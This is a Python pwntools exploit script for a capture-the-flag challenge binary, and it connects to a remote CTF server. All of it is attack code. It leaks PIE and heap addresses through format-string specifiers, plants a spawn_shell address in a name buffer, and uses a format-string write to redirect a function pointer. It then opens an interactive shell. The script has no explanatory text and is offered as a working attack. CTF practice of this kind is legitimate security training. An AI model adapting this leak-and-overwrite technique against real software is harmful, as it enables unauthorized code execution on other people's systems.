#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

gdb_script = '''
    b *main+54
    b *print_cover_menu
    b *check_name+93
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r, gdb_script)
    else:
        r = remote("pwn.hackini25.shellmates.club", 1404, ssl=True)

    return r


def main():
    r = conn()

    fmt_offset = 12
    r.sendlineafter(b">", b"4")
    r.sendlineafter(b">", b"%33$p")

    r.recvuntil(b"Checking name : ")
    main_leak = int(r.recvline().decode(), 16)

    main = 0x166f
    cover_off = 0x40c0
    
    pie = main_leak - exe.sym.main
    win = pie + exe.sym.spawn_shell
    cover = pie + cover_off

    log.info(f"Pie at @ {hex(pie)}")
    log.info(f"Cover at @ {hex(cover)}")

    payload = flat(
        b"CTFinggg",
        p64(win)
    )

    r.sendlineafter(b">", b"3")
    r.sendlineafter(b"Enter name:", payload)

    r.sendlineafter(b">", b"4")
    r.sendlineafter(b">", b"%13$p")

    r.recvuntil(b"Checking name : ")
    heap = int(r.recvline().decode(), 16)

    note = heap + 0x40

    log.info(f"Heap note @ {hex(note)}")

    fmt_offset = 6
    writes = { cover: note }
    payload = fmtstr_payload(fmt_offset, writes, write_size='short')

    r.sendlineafter(b">", b"4")
    r.sendlineafter(b">", payload)

    r.sendlineafter(b">", b"1")

    r.interactive()


if __name__ == "__main__":
    main()
